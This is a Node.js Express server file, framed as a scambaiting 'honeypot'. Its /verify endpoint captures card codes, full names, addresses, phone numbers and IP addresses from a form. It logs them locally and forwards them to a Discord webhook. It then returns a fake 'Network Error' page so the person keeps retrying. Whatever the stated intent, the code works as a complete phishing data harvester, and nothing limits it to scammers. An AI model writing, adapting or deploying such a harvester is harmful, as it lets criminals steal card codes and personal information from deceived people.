const express = require('express');
const requestIp = require('request-ip');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(requestIp.mw());

// Serve static files (the frontend)
app.use(express.static('public'));

// Endpoint to capture form data
app.post('/verify', async (req, res) => {
    const ip = req.clientIp;
    const timestamp = new Date().toISOString();
    const { cardCode, phoneNumber, fullName, address, city, zipCode } = req.body;

    const logEntry = `[${timestamp}] IP: ${ip} | Code: ${cardCode} | Name: ${fullName} | Addr: ${address}, ${city} ${zipCode} | Ph: ${phoneNumber}\n`;

    // 1. Local logging (only works on local PC/VPS)
    try {
        fs.appendFileSync('logs.txt', logEntry);
    } catch (e) {
        console.error("Local log failed (ignore if on Vercel)");
    }

    console.log(`Captured: ${logEntry.trim()}`);

    // 2. Discord logging (works on Vercel!)
    if (DISCORD_WEBHOOK_URL) {
        try {
            await axios.post(DISCORD_WEBHOOK_URL, {
                content: "🚨 **NEW SCAMMER CAPTURED!** 🚨",
                embeds: [{
                    title: "Honeypot Entry Captured",
                    color: 16711680, // Red
                    fields: [
                        { name: "IP Address", value: ip, inline: true },
                        { name: "Full Name", value: fullName || "N/A", inline: true },
                        { name: "Phone", value: phoneNumber || "N/A", inline: true },
                        { name: "Card Code", value: `\`${cardCode}\`` },
                        { name: "Address", value: `${address}, ${city} ${zipCode}` },
                        { name: "Timestamp", value: timestamp }
                    ]
                }]
            });
        } catch (error) {
            console.error('Discord Webhook error:', error.message);
        }
    }

    // Return a generic error to keep the "scammer" on the hook
    res.send(`
        <div style="font-family: sans-serif; text-align: center; padding: 50px;">
            <h2 style="color: red;">Network Error</h2>
            <p>Verification failed. Please check your card code and try again in 10 minutes.</p>
            <a href="/">Go Back</a>
        </div>
    `);
});

// Export the app for Vercel
module.exports = app;

if (require.main === module) {
    app.listen(port, () => {
        console.log(`Honeypot server running at http://localhost:${port}`);
        console.log(`View logs in 'logs.txt' (local) or via Discord Webhook (cloud)`);
    });
}
